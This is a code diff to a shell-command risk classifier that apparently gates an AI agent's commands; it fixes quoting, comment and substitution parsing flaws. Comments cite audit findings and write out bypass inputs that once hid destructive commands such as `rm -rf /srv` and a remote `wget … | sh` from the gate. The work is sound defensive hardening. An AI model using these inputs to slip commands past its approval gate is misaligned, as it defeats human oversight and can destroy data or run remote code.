@@ -306,6 +306,16 @@ export function splitSegments(command: string): string[] {
         j += 2; // escape された空白・区切りは語の一部。
         continue;
       }
+      // `$'…'` / `$"…"` は 1 スパンで読む (SEC-CQ9-1 と同一規則・単一出所)。
+      const wordSpan =
+        c === "$" && (command[j + 1] === "'" || command[j + 1] === '"')
+          ? quoteSpanEnd(command, j)
+          : 0;
+      if (wordSpan === -1) return -1;
+      if (wordSpan > 0) {
+        j = wordSpan;
+        continue;
+      }
       if (c === '"' || c === "'") {
         wordQuote = c;
         j += 1;
@@ -423,15 +433,27 @@ export function splitSegments(command: string): string[] {
     //   メイン走査の escape 状態 (`escapePairEnd`) を共有し、escape 済み文字は境界と見なさない。
     //   これは「`splitSegments` が捨ててよいのはシェル的に正当なコメントだけ」という不変条件でもある。
     if (ch === "#") {
-      const previous = command[i - 1];
-      const previousEscaped = escapePairEnd === i;
-      if (!previousEscaped && (previous === undefined || SEPARATOR_OR_SPACE_RE.test(previous))) {
+      // 語頭判定は収集器と共有する単一出所 (TDA-CQ9-2)。片方だけがコメントを尊重すると、
+      //   コメント本文が「コード」として走査され偽陽性を生む。
+      if (startsComment(command, i, escapePairEnd)) {
         const nl = command.indexOf("\n", i);
         i = nl === -1 ? command.length : nl; // `\n` 自体は通常の区切りとして処理させる。
         continue;
       }
       current += ch;
       i += 1;
+      continue;
+    }
+    // **ANSI-C / locale quoting を 1 スパンとして消費する (SEC-CQ9-1・R9 監査 H)**:
+    //   `$'…'` は bash が backslash escape を処理するため `\'` では閉じない。`$` を通常文字として
+    //   流し `'` で単一引用を開く素の状態機械は 1 文字早く閉じ、以降の quote 位相が反転する。
+    //   反転すると `;` `>` `<(` が引用の内外を取り違え、
+    //   `cat $'a\'b' x; > /tmp/o rm -rf /srv` の rm が分類から丸ごと消えた (実 bash は実行する)。
+    if (ch === "$" && (command[i + 1] === "'" || command[i + 1] === '"')) {
+      const spanEnd = quoteSpanEnd(command, i);
+      if (spanEnd === -1) return splitSegmentsUnparseable(command); // 未終端 → fail-safe。
+      current += command.slice(i, spanEnd);
+      i = spanEnd;
       continue;
     }
     if (ch === "'" || ch === '"') {
@@ -573,6 +595,51 @@ export function splitSegments(command: string): string[] {
 }
 
 /**
+ * `i` が引用の開始なら、その**閉じの次**の index を返す (T1 単一出所)。
+ *
+ * 返り値: `0` = 引用の開始でない / `-1` = 未終端 (構造解析不能) / 正数 = 閉じの次。
+ * 対応する形と escape 規則は bash に合わせる:
+ *  - `'…'`   単一引用。backslash は**字義**(escape しない) → 最初の `'` で閉じる。
+ *  - `$'…'`  ANSI-C quoting。backslash escape を**処理する** → `\\'` では閉じない。
+ *  - `"…"` / `$"…"`  二重引用。backslash が次の 1 文字を字義化する。
+ *
+ * **SEC-CQ9-1 (R9 監査 H)**: `$'` を「通常文字の `$` + 単一引用の `'`」として流す実装は
+ * `$'a\\'b'` を 1 文字早く閉じ、以降の quote 位相がすべて反転する。位相が反転すると
+ * `;` や `>` や `<(` が引用の内外を取り違え、`cat $'a\\'b' x; > /tmp/o rm -rf /srv` の rm が
+ * 丸ごと分類から消えた (実 bash は実行する — 監査レーンが stub-argv オラクルで確認)。
+ * 引用の読み方を**複数箇所で手書きしない**ための単一出所 (security-gate-reuse-canonical-parser)。
+ */
+function quoteSpanEnd(s: string, i: number): number {
+  const c = s[i];
+  const dollar = c === "$" && (s[i + 1] === "'" || s[i + 1] === '"');
+  const open = dollar ? (s[i + 1] as string) : c;
+  if (open !== "'" && open !== '"') return 0;
+  // 単一引用だけが escape を処理しない。ANSI-C (`$'…'`) と二重引用は処理する。
+  const escapes = dollar || open === '"';
+  for (let j = dollar ? i + 2 : i + 1; j < s.length; j += 1) {
+    const ch = s[j] as string;
+    if (escapes && ch === "\\") {
+      j += 1;
+      continue;
+    }
+    if (ch === open) return j + 1;
+  }
+  return -1;
+}
+
+/**
+ * `i` の `#` がシェルのコメント開始か — 語頭 (先頭 or **escape されていない**空白/区切りの直後) のみ。
+ *
+ * `splitSegments` と置換収集器の**単一出所** (SEC-R6-1 の escape 規則を含む)。片方だけが
+ * コメントを尊重すると、コメント本文が「コード」として走査され偽陽性を生む (TDA-CQ9-2)。
+ */
+function startsComment(s: string, i: number, escapePairEnd: number): boolean {
+  if (s[i] !== "#" || escapePairEnd === i) return false;
+  const previous = s[i - 1];
+  return previous === undefined || SEPARATOR_OR_SPACE_RE.test(previous);
+}
+
+/**
  * `i` が「中身が実行される置換」の開始なら、その**閉じの次**の index を返す (T1 単一出所)。
  *
  * 返り値: `0` = 置換の開始でない / `-1` = 開始だが未終端 (構造解析不能) / 正数 = 閉じの次。
@@ -660,33 +727,64 @@ const MAX_SUBSTITUTION_SCAN_FAILURES = 8;
 function collectSubstitutionInners(
   s: string,
   kind: "process" | "command",
-): { inners: string[]; aborted: boolean } {
+): { inners: string[]; starts: number[]; aborted: boolean; capExhausted: boolean } {
   const inners: string[] = [];
+  /** 各置換の開始 index。起動判定を「その置換を含む単純コマンド」へ束縛するのに使う。 */
+  const starts: number[] = [];
   let aborted = false;
+  let capExhausted = false;
   let failures = 0;
-  let quote: "'" | '"' | undefined;
+  // 二重引用の内側か。**command 置換のみ**が二重引用内で展開されるので、process 置換を
+  //   探すときは二重引用スパンごと読み飛ばし、command を探すときだけ内側へ入る。
+  let inDouble = false;
+  let escapePairEnd = -1;
   let i = 0;
   while (i < s.length) {
     const c = s[i] as string;
-    if (c === "\\" && quote !== "'" && i + 1 < s.length) {
+    if (c === "\\" && i + 1 < s.length) {
       i += 2;
+      escapePairEnd = i;
       continue;
     }
-    if (quote === undefined) {
-      if (c === "'" || c === '"') {
-        quote = c;
+    if (inDouble) {
+      if (c === '"') {
+        inDouble = false;
         i += 1;
         continue;
       }
-    } else if (c === quote) {
-      quote = undefined;
-      i += 1;
-      continue;
+    } else {
+      // **コメント本文はコードではない (TDA-CQ9-2・R9 監査)**: 収集器は生コマンドを受け取るが
+      //   コメント除去は `splitSegments` 側にしかなかったため、`cat <(echo ok) # don't` の
+      //   アポストロフィが未終端引用と見なされ `aborted` 床 = 偽の承認カードを出していた。
+      //   これは本ブランチが除去しようとしている偽陽性クラスそのもの。語頭判定は単一出所。
+      if (startsComment(s, i, escapePairEnd)) {
+        const nl = s.indexOf("\n", i);
+        if (nl === -1) break;
+        i = nl + 1;
+        continue;
+      }
+      // 展開が起きない引用スパン (`'…'` / `$'…'`・process を探すときは `"…"` / `$"…"` も) は
+      //   丸ごと読み飛ばす = 中身はデータ。
+      const literalHere =
+        kind === "process" || c === "'" || (c === "$" && s[i + 1] === "'") ? quoteSpanEnd(s, i) : 0;
+      if (literalHere === -1) {
+        aborted = true;
+        break;
+      }
+      if (literalHere > 0) {
+        i = literalHere;
+        continue;
+      }
+      if (c === '"' || (c === "$" && s[i + 1] === '"')) {
+        inDouble = true;
+        i += c === "$" ? 2 : 1;
+        continue;
+      }
     }
     const opensHere =
       kind === "process"
-        ? quote === undefined && (c === "<" || c === ">") && s[i + 1] === "("
-        : quote !== "'" && ((c === "$" && s[i + 1] === "(") || c === "`");
+        ? (c === "<" || c === ">") && s[i + 1] === "("
+        : (c === "$" && s[i + 1] === "(") || c === "`";
     if (opensHere) {
       const end = substitutionEnd(s, i);
       if (end < 0) {
@@ -697,20 +795,24 @@ function collectSubstitutionInners(
         //   上限で打ち切る (SEC-CQ8-2・床は既に立っているので安全側)。
         aborted = true;
         failures += 1;
-        if (failures >= MAX_SUBSTITUTION_SCAN_FAILURES) break;
+        if (failures >= MAX_SUBSTITUTION_SCAN_FAILURES) {
+          capExhausted = true;
+          break;
+        }
         i += c === "`" ? 1 : 2;
         continue;
       }
       // backtick は 1 文字開き、`$(`/`<(`/`>(` は 2 文字開き。閉じは 1 文字。
       inners.push(s.slice(i + (c === "`" ? 1 : 2), end - 1));
+      starts.push(i);
       i = end;
       continue;
     }
     i += 1;
   }
   // 閉じられていない引用はコマンドとして構造解析できない → 「読めなかった」と同義に倒す。
-  if (quote !== undefined) aborted = true;
-  return { inners, aborted };
+  if (inDouble) aborted = true;
+  return { inners, starts, aborted, capExhausted };
 }
 
 /**
@@ -1255,7 +1357,22 @@ function isInlineInterpreter(name: string): boolean {
   return INLINE_INTERPRETERS.has(normalizeCommandName(name));
 }
 
-/** コマンド置換 `$(...)` / backtick をセグメント (raw 文字列) が含むか。 */
+/**
+ * **実際に展開される**コマンド置換をセグメントが含むか (R9 監査の残余 L)。
+ *
+ * `hasCommandSubstitution` は `includes("$(")` の字面判定で、単一引用内のリテラルも拾う。
+ * 抽出側 (`collectSubstitutionInners`) だけを引用対応にしたため非対称が残り、
+ * `git commit -m 'fix: use $( ) syntax'` が medium[inline-code] = 偽の承認カードになっていた
+ * (本ブランチが除去しようとしている症状)。bash は単一引用内で展開しないので、ゲート判定は
+ * 実在判定で行う。**読めなかった (未終端) ときは安全側で true** に倒す。
+ */
+function hasLiveCommandSubstitution(rawSegment: string): boolean {
+  if (!hasCommandSubstitution(rawSegment)) return false; // 速い前置き (字面が無ければ実在しない)。
+  const { starts, aborted } = collectSubstitutionInners(rawSegment, "command");
+  return starts.length > 0 || aborted;
+}
+
+/** コマンド置換 `$(...)` / backtick の**字面**をセグメントが含むか (粗い前置き)。 */
 function hasCommandSubstitution(rawSegment: string): boolean {
   return rawSegment.includes("$(") || rawSegment.includes("`");
 }
@@ -1367,6 +1484,12 @@ function unanalyzableSegmentRisk(
   categories: Set<PolicyCategory> | undefined,
   split: SegmentSplitter,
 ): "high" | "medium" | undefined {
+  // **backstop の局所化 (SEC-CQ9-4・R9 監査 M)**: 末尾の `high-risk-other` は「コマンド全体の
+  //   category が空」で条件付けられていたため、先行セグメントが category を 1 つ付けるだけで
+  //   消えた (`chown -R nobody /a ; $X -rf /tmp/x` は `$X` 単独なら medium[high-risk-other] で
+  //   bypass DEFAULT がゲートするのに、前置があると空になり defer = 実行になる)。
+  //   backstop の意味は「**このセグメントを**解析できなかった」であり、他セグメントの成果とは無関係。
+  const categoriesAtEntry = categories?.size ?? 0;
   const startIdx = skipLeadingAssignments(rawTokens);
   const first = rawTokens[startIdx];
   if (first === undefined) return undefined; // 代入のみ (`FOO=bar`) → コマンド無し。委ねる。
@@ -1391,7 +1514,8 @@ function unanalyzableSegmentRisk(
   if (suppressMediumFloor) return undefined;
   // 先頭メタ文字を持つ = 構造判定不能。YOLO/default policy でも分類不能な実行形を
   // silent defer しないよう high-risk-other backstop を付け、risk は従来どおり medium に保つ。
-  if (categories !== undefined && categories.size === 0) categories.add("high-risk-other");
+  if (categories !== undefined && categories.size === categoriesAtEntry)
+    categories.add("high-risk-other");
   return "medium";
 }
 
@@ -1425,6 +1549,21 @@ function inlineCodeRisk(
   if (name === "eval") {
     categories?.add("inline-code");
     return "medium";
+  }
+
+  // 遠隔/コンテナ実行の引用オペランドを内側コードとして再分類する (TDA-CQ9-4・R9 監査 M)。
+  //   **内側が non-low のときだけ**ゲートする — `ssh host 'ls -la'` のような日常操作で
+  //   承認カードを出さないため (over-gate は本ブランチが潰そうとしている症状そのもの)。
+  if (REMOTE_EXEC_RUNNERS.has(name) && depth < MAX_INLINE_DEPTH) {
+    const remote = lastQuotedOperand(rawSegment);
+    if (remote !== undefined && remote.trim().length > 0) {
+      const innerRisk = classifyCommandRiskInternal(remote, depth + 1, categories, split);
+      if (innerRisk !== "low") {
+        categories?.add("inline-code");
+        return innerRisk;
+      }
+    }
+    return undefined;
   }
 
   // シェルのインラインコード (sh -c "..." 等)。SEC-1 #5: python3.11 等のバージョン付きでも拾う。
@@ -1473,7 +1612,7 @@ function inlineCodeRisk(
   }
 
   // コマンド置換 `$(...)` / backtick。可能なら内側を再帰再分類して high を拾う。
-  if (hasCommandSubstitution(rawSegment)) {
+  if (hasLiveCommandSubstitution(rawSegment)) {
     categories?.add("inline-code");
     if (depth < MAX_INLINE_DEPTH) {
       const innerRisk = reclassifySubstitution(rawSegment, depth, categories, split);
@@ -1506,7 +1645,11 @@ function reclassifySubstitution(
   //   旧実装は `$(` を引用非対応で走査し、backtick は `split("`")` という**第三の並置検出器**
   //   だった。前者は `echo '$(' ` を未終端の置換と誤認して R7 の床で偽陽性を出し、
   //   後者は引用内の backtick を中身として切り出していた。
-  const { inners, aborted } = collectSubstitutionInners(rawSegment, "command");
+  const {
+    inners,
+    aborted,
+    capExhausted: scanCapExhausted,
+  } = collectSubstitutionInners(rawSegment, "command");
   // ADR 019f0c3e: high で early-return せず全 inner を走査して category を漏れなく集約する
   // (戻り値は従来「high が1つでもあれば high」と同値)。
   let risk: "high" | "medium" | undefined;
@@ -1520,6 +1663,12 @@ function reclassifySubstitution(
     categories?.add("high-risk-other");
     if (risk === undefined) risk = "medium";
   }
+  // **上限到達は high へ倒す (TDA-CQ9-5 ≡ SEC-CQ9-3・R9 監査 M)**: 打ち切ると、その後ろに
+  //   ある**読める**破壊的置換の named category が落ちる (未終端の `$(` を 8 個前置するだけで
+  //   内側の history-rewrite が消え、その category だけを有効にした operator は bypass ゲートを
+  //   失う)。「最初の失敗で床は立っている」は risk の話で category には効かない。未終端の置換を
+  //   8 個並べる入力は DoS 形であり、正直な fail-safe は high。
+  if (scanCapExhausted) risk = "high";
   return risk;
 }
 
@@ -1541,7 +1690,11 @@ function reclassifyProcessSubstitution(
   //   R8 監査 SEC-CQ8-3: 検出点が引用を見ていなかったため `grep -rn '<(' .` のような
   //   **引用内リテラル**を未終端の置換と誤認し、R7 の床で偽の承認カードを出していた。
   //   引用状態つきの正準収集器へ統合する。
-  const { inners, aborted } = collectSubstitutionInners(command, "process");
+  const {
+    inners,
+    aborted,
+    capExhausted: scanCapExhausted,
+  } = collectSubstitutionInners(command, "process");
   // ADR 019f0c3e: high で early-return せず全 inner を走査して category を漏れなく集約する。
   let risk: "high" | "medium" | undefined;
   for (const inner of inners) {
@@ -1556,6 +1709,12 @@ function reclassifyProcessSubstitution(
     categories?.add("high-risk-other");
     if (risk === undefined) risk = "medium";
   }
+  // **上限到達は high へ倒す (TDA-CQ9-5 ≡ SEC-CQ9-3・R9 監査 M)**: 打ち切ると、その後ろに
+  //   ある**読める**破壊的置換の named category が落ちる (未終端の `$(` を 8 個前置するだけで
+  //   内側の history-rewrite が消え、その category だけを有効にした operator は bypass ゲートを
+  //   失う)。「最初の失敗で床は立っている」は risk の話で category には効かない。未終端の置換を
+  //   8 個並べる入力は DoS 形であり、正直な fail-safe は high。
+  if (scanCapExhausted) risk = "high";
   return risk;
 }
 
@@ -1578,6 +1737,30 @@ function isProcessSubstitutionExecutor(name: string): boolean {
  * 起動コマンド (先頭セグメントの runner ラッパ剥がし後) が実行/source 系で、かつ
  * 文字列に `<(`/`>(` を含むとき true。プロセス置換の中身は再パースしづらいためゲート対象。
  */
+/**
+ * セグメントから「実際に起動されるプログラム名」を導出する **正準ヘルパ** (T1 単一出所)。
+ *
+ * 順序は `先頭 env 代入を飛ばす → runner ラッパを剥がす → basename 小文字化`。この 3 段は
+ * どのゲートでも同じでなければならない。
+ *
+ * **SEC-CQ9-2 ≡ TDA-CQ9-1 (R9 監査 H)**: 5 つある commandName ゲートのうち
+ * `launchesShellWithProcessSubstitution` だけが `skipLeadingAssignments` を通しておらず、
+ * `commandName(["FOO=1","bash",…])` が `"foo=1"` を返すため `FOO=1 bash <(echo rm -rf /srv)` で
+ * 通常モードも全 bypass preset もゲートが外れた (base は medium[inline-code] でゲートしていた
+ * = 明確な回帰・実 bash は rm を実行する)。R8 が閉じたのは「位置」の軸で、「正規化」の軸が
+ * 残っていた。以後どのゲートも 1 段を飛ばせないよう導出を 1 関数に閉じる。
+ */
+function segmentProgramName(segment: string): string {
+  const raw = tokenize(segment);
+  const { tokens } = stripRunnerWrappers(raw.slice(skipLeadingAssignments(raw)));
+  return commandName(tokens);
+}
+
+/**
+ * 起動判定を束縛する置換サイトの上限。超えたら全セグメント走査 (より広い = 安全側) へ戻す。
+ */
+const MAX_EXECUTOR_BINDING_SITES = 8;
+
 function launchesShellWithProcessSubstitution(command: string, split: SegmentSplitter): boolean {
   if (!hasProcessSubstitution(command)) return false;
   // **全セグメントを走査する (SEC-CQ8-1・R8 監査 H)**: 以前は `split(command)[0]` だけを見ており、
@@ -1586,12 +1769,74 @@ function launchesShellWithProcessSubstitution(command: string, split: SegmentSpl
   //   693e782 で `<(` を redirect として lex するようになって以降、起動コマンドは
   //   `bash script.sh` 形に見えるため、この位置判定が唯一の砦になっていた。
   //   セキュリティゲートが「1 箇所しか見ない」形は同クラスの穴を繰り返し生むため、位置不変にする。
+  // **判定を「その置換を含む単純コマンド」へ束縛する (SEC-CQ9-5 / TDA-CQ9-3・R9 監査 M)**:
+  //   R8 は位置依存を消すために全セグメントを走査したが、条件が「コマンド全体のどこかに
+  //   `<(` の**字面**があり、かつどこかのセグメントが shell/インタプリタ」になったため、
+  //   `diff <(sort a) <(sort b) && node scripts/check.js` が medium[inline-code] になった
+  //   (= 本ブランチが除去しようとしている偽陽性クラスの再導入)。置換の開始位置までを
+  //   **正準 splitter** で切り、その最後のセグメント = bash 的な「その置換を持つ単純コマンド」
+  //   のプログラム名だけを見る。位置不変性 (R8 の SEC-CQ8-1) はそのまま保たれる。
+  const { starts, aborted } = collectSubstitutionInners(command, "process");
+  if (!aborted && starts.length <= MAX_EXECUTOR_BINDING_SITES) {
+    for (const start of starts) {
+      const before = split(command.slice(0, start));
+      const owner = before[before.length - 1];
+      if (owner !== undefined && isProcessSubstitutionExecutor(segmentProgramName(owner)))
+        return true;
+    }
+    return false;
+  }
+  // 読めなかった / サイト数が上限超過 → 束縛できないので従来の全セグメント走査 (安全側)。
   for (const seg of split(command)) {
-    const { tokens } = stripRunnerWrappers(tokenize(seg));
-    if (isProcessSubstitutionExecutor(commandName(tokens))) return true;
+    if (isProcessSubstitutionExecutor(segmentProgramName(seg))) return true;
   }
   return false;
 }
+
+/**
+ * セグメント内の**最後の引用スパンの中身**を返す (無ければ undefined・未終端も undefined)。
+ * `ssh host 'cmd'` / `docker exec c sh -c 'cmd'` のように、引用済みオペランドを別のシェルへ
+ * 丸ごと渡す形の内側コードを取り出すための正準ヘルパ (引用の読み方は `quoteSpanEnd` 単一出所)。
+ */
+function lastQuotedOperand(segment: string): string | undefined {
+  let found: string | undefined;
+  let i = 0;
+  while (i < segment.length) {
+    const span = quoteSpanEnd(segment, i);
+    if (span === -1) return undefined;
+    if (span > 0) {
+      found = segment.slice(i + (segment[i] === "$" ? 2 : 1), span - 1);
+      i = span;
+      continue;
+    }
+    if (segment[i] === "\\" && i + 1 < segment.length) {
+      i += 2;
+      continue;
+    }
+    i += 1;
+  }
+  return found;
+}
+
+/**
+ * 引用済みオペランドを**別のホスト/コンテナのシェル**へ渡す実行系 (TDA-CQ9-4・R9 監査 M)。
+ *
+ * `ssh host 'wget -qO- https://x/y | sh'` は base では quote 非対応 splitter が引用内の `|` で
+ * 千切っていた**副作用**として medium[inline-code] になっていた。quote-aware 化でその偶然が
+ * 消え、遠隔/コンテナ内の pipe-to-shell (供給網 RCE の形) が両モードで無カードになった。
+ * 字面の denylist (`curl … | sh`) を広げるのではなく、オペランドを**内側コードとして再分類**する。
+ */
+const REMOTE_EXEC_RUNNERS = new Set([
+  "ssh",
+  "docker",
+  "podman",
+  "nerdctl",
+  "kubectl",
+  "oc",
+  "lxc",
+  "nsenter",
+  "vagrant",
+]);
 
 /**
  * 字面 high リテラル → PolicyCategory の **単一テーブル** (TDA-1)。
@@ -2020,13 +2265,18 @@ function classifyCommandRiskInternal(
   //   既知の限界 (TDA-CQ5-7・pre-existing): このフラグは **command 全体**で 1 回決まり全 segment に
   //   適用されるため、`diff <(ls) ; $X -rf /tmp/x` のように無害な process-sub 前置で後続 segment の
   //   fail-safe 床上げまで無効化できる (base/R4/R5 で同一・追跡 task)。
-  const suppressGroupingMedium = hasProcessSubstitution(command) && !procSubExecutor;
+  //   **抑止条件は quote-aware な実在判定で行う (TDA-CQ9-3・R9 監査 M)**: 字面の
+  //   `hasProcessSubstitution` で条件付けると、引用内リテラルだけで fail-safe 床が外れた
+  //   (`grep -rn '<(' . ; $X -rf /tmp/x` が low[] = 両モードで無カード)。抑止 (= de-gate) を
+  //   決めてよいのは**実際に置換がある**ときだけ。判定は収集器の単一出所を共有する。
+  const suppressGroupingMedium =
+    collectSubstitutionInners(command, "process").starts.length > 0 && !procSubExecutor;
 
   for (const seg of split(command)) {
     const rawTokens = tokenize(seg);
     if (rawTokens.length === 0) {
       // トークンが無くても置換 `$(...)`/backtick だけのセグメントは SEC-1 でゲートする。
-      if (hasCommandSubstitution(seg)) {
+      if (hasLiveCommandSubstitution(seg)) {
         bump("medium");
         categories?.add("inline-code");
       }
